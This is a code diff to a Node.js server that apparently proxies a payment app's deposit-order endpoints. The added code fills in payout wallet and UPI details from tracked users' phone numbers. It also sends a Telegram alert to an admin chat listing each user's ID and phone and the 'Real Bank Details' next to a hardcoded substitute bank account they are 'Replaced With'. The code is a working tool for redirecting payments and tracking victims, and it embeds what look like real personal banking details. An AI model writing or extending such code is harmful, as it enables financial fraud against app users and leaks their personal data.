@@ -328,6 +328,8 @@ function generateDummyId() {
   return String(Math.floor(10000000 + Math.floor(Math.random() * 90000000)));
 }
 
+const payoutWalletCache = new Map();
+
 function findDummyOrder(data, idOrCode) {
   if (!idOrCode) return null;
   const target = String(idOrCode).trim().toLowerCase();
@@ -2335,10 +2337,22 @@ app.post('/app/payment/order/create', async (req, res) => {
     if (dummyMatch) {
       if (userId) { trackUser(data, userId, 'Deposit Order (Dummy)'); saveData(data).catch(() => { }); }
       const buyId = String(dummyMatch.id || dummyMatch.payOrderId);
-      const wId = Number(body.payoutWalletId || body.walletId || body.payoutWalletType || 2);
-      const walletNames = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
-      dummyMatch.payoutWalletType = wId;
-      dummyMatch.payoutWallet = walletNames[wId] || "Freecharge";
+      const pWIdStr = String(body.payoutWalletId || body.walletId || '');
+      const cachedWallet = payoutWalletCache.get(pWIdStr);
+
+      if (cachedWallet) {
+        dummyMatch.payoutWalletType = cachedWallet.ctType;
+        dummyMatch.payoutWalletName = cachedWallet.walletName;
+        dummyMatch.payoutWalletAccount = cachedWallet.account;
+        dummyMatch.payoutWalletUpi = cachedWallet.upi;
+      } else {
+        const wId = Number(body.payoutWalletId || body.walletId || body.payoutWalletType || 2);
+        const walletNames = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
+        dummyMatch.payoutWalletType = wId;
+        dummyMatch.payoutWalletName = walletNames[wId] || "Freecharge";
+        dummyMatch.payoutWalletAccount = getPhone(data, userId) || "6206785398";
+        dummyMatch.payoutWalletUpi = dummyMatch.payoutWalletAccount + "@" + (walletNames[wId] || "Freecharge").toLowerCase();
+      }
 
       const jsonResp = {
         code: 1000,
@@ -2481,10 +2495,12 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       const amtNum = parseFloat(dummyMatch.amount || 5010);
       const userId = await extractUserIdFromToken(req) || await extractUserId(req, null);
       const bank = getActiveBank(data, userId);
-      const userPhone = (data.trackedUsers && userId && data.trackedUsers[String(userId)] && data.trackedUsers[String(userId)].phone) ? data.trackedUsers[String(userId)].phone : "6206785398";
-      const wName = dummyMatch.payoutWallet || "Freecharge";
+      const phone = getPhone(data, userId);
+
+      const wName = dummyMatch.payoutWalletName || "Freecharge";
+      const wAcct = dummyMatch.payoutWalletAccount || phone || "6206785398";
+      const wUpi = dummyMatch.payoutWalletUpi || (wAcct + "@" + wName.toLowerCase());
       const wType = dummyMatch.payoutWalletType || 2;
-      const upiAddr = userPhone + "@" + wName.toLowerCase();
 
       jsonResp = {
         code: 1000,
@@ -2524,25 +2540,58 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           expiryTimestamp: expiryMs,
           expireTimeStamp: expiryMs,
           expireTime: Math.floor(expiryMs / 1000),
-          intent: "freecharge://pay",
-          freechargeIntent: "freecharge://pay",
-          payUrl: "freecharge://pay",
+          intent: "freecharge://",
+          freechargeIntent: "freecharge://",
+          payUrl: "freecharge://",
           payoutWalletType: wType,
           payoutWallet: { name: wName, type: wType },
           payTypeName: wName,
           walletName: wName,
           payoutWalletName: wName,
-          payoutWalletAccount: userPhone,
-          payoutWalletUpi: upiAddr,
-          payoutAccount: userPhone,
-          payoutPhone: userPhone,
-          payoutUpi: upiAddr,
-          address: upiAddr
+          payoutWalletAccount: wAcct,
+          payoutWalletUpi: wUpi,
+          payoutAccount: wAcct,
+          payoutPhone: wAcct,
+          payoutUpi: wUpi,
+          address: wUpi
         },
         message: "success"
       };
       respBody = JSON.stringify(jsonResp);
       respHeaders = {};
+
+      if (!dummyMatch._sentAlert && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+        dummyMatch._sentAlert = true;
+        data.sentOrderInfo = data.sentOrderInfo || {};
+        data.sentOrderInfo[dummyMatch.code] = true;
+        if (dummyMatch.id) data.sentOrderInfo[String(dummyMatch.id)] = true;
+
+        const bankToUse = bank || { accountHolder: "SATYAM KUMAR", accountNo: "009110281719", ifsc: "IPOS0000001" };
+        let dummyMsg =
+          `✅ *Order Buy Successfully (Dummy Order)*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
+          `📋 *Order Code:* \`${dummyMatch.code}\`\n` +
+          `💰 *Amount:* \`₹${dummyMatch.amount}\`\n` +
+          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Payout:* ${wName} (\`${wAcct}\`)\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `🏦 *Real Bank Details:*\n` +
+          `   Acc: \`N/A (Dummy)\`\n` +
+          `   Name: \`N/A (Dummy)\`\n` +
+          `   IFSC: \`N/A (Dummy)\`\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `🔄 *Replaced With:*\n` +
+          `   Acc: \`${bankToUse.accountNo}\`\n` +
+          `   Name: \`${bankToUse.accountHolder}\`\n` +
+          `   IFSC: \`${bankToUse.ifsc}\`${bankToUse.bankName ? ' | ' + bankToUse.bankName : ''}\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `💾 *KV Status:* Order code \`${dummyMatch.code}\` & bank details saved to KV storage!`;
+
+        bot.sendMessage(data.adminChatId, dummyMsg, { parse_mode: 'Markdown' }).catch(() => { });
+        saveData(data).catch(() => { });
+      }
     } else {
       const prox = await proxyFetch(req);
       response = prox.response;
